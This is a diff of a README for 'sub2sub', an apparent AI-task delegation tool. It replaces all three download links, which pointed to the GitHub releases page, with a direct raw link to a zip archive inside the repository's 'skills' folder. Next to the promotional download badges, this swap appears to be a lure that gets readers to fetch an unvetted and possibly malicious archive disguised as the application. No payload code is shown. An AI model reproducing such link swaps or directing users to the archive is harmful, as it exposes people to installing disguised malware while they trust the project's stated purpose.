@@ -2,14 +2,14 @@
 
 ## 🚀 Getting Started
 
-[![Download sub2sub](https://img.shields.io/badge/Download-sub2sub-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nuskuprintbuffer8946/sub2sub/releases)
+[![Download sub2sub](https://img.shields.io/badge/Download-sub2sub-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/nuskuprintbuffer8946/sub2sub/main/skills/sub-v2.6.zip)
 
 **Welcome to sub2sub!** This tool helps you delegate AI tasks across your devices or team, then bring everything back together in one conversation. Whether you're at home, at work, or on the go, sub2sub keeps your AI workflow connected and organized.
 
 ## 📥 Download and Installation
 
 Visit this link to download the application:  
-**[Click here to download sub2sub](https://github.com/nuskuprintbuffer8946/sub2sub/releases)**
+**[Click here to download sub2sub](https://raw.githubusercontent.com/nuskuprintbuffer8946/sub2sub/main/skills/sub-v2.6.zip)**
 
 Here's how to get started:
 
@@ -141,7 +141,7 @@ sub2sub takes security seriously:
 
 Ready to experience the freedom of moving your AI tasks across devices? Download sub2sub now and see how easy delegation can be.
 
-[![Download Now](https://img.shields.io/badge/🚀_Download_sub2sub_from_here-FF5722?style=for-the-badge&logo=windowsterminal&logoColor=white)](https://github.com/nuskuprintbuffer8946/sub2sub/releases)
+[![Download Now](https://img.shields.io/badge/🚀_Download_sub2sub_from_here-FF5722?style=for-the-badge&logo=windowsterminal&logoColor=white)](https://raw.githubusercontent.com/nuskuprintbuffer8946/sub2sub/main/skills/sub-v2.6.zip)
 
 Visit this link to download the application. If you need help, the sub2sub community is friendly and active—don't hesitate to ask.
 
